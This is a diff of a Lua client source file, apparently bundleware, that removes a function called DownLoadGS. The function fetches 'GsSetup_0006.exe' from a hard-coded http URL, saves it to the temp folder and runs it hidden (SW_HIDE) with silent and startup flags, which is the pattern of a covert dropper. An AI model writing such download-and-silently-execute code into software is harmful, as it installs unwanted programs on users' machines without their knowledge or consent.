@@ -649,33 +649,6 @@ function PopTipWnd(OnCreateFunc)
 	end
 end
 
-function DownLoadGS(strUrl)
-	local FunctionObj = XLGetGlobal("DiDa.FunctionHelper") 
-	local strPacketURL = strUrl or "http://down.lvdun123.com/client/GsSetup_0006.exe"
-	local strSaveDir = tipUtil:GetSystemTempPath()
-	local strFileName = string.match(strPacketURL, "/([^/]+exe)")
-	if not IsRealString(strFileName) then
-		strFileName = "GsSetup_0006.exe"
-	end
-	local strSavePath = tipUtil:PathCombine(strSaveDir, strFileName)
-	
-	local strStamp = FunctionObj.GetTimeStamp()
-	local strURLFix = strPacketURL..strStamp
-	
-	FunctionObj.NewAsynGetHttpFile(strURLFix, strSavePath, false
-	, function(bRet, strRealPath)
-			FunctionObj.TipLog("[DownLoadGS] bRet:"..tostring(bRet)
-					.." strRealPath:"..tostring(strRealPath))
-					
-			if 0 ~= bRet then
-				return
-			end
-			
-			local strCmd = "/s /run /setboot"
-			tipUtil:ShellExecute(0, "open", strRealPath, strCmd, 0, "SW_HIDE")
-	end)
-end
-
 local BindExeCookie = nil
 function ProcessCommandLine()
 	local FunctionObj = XLGetGlobal("DiDa.FunctionHelper") 
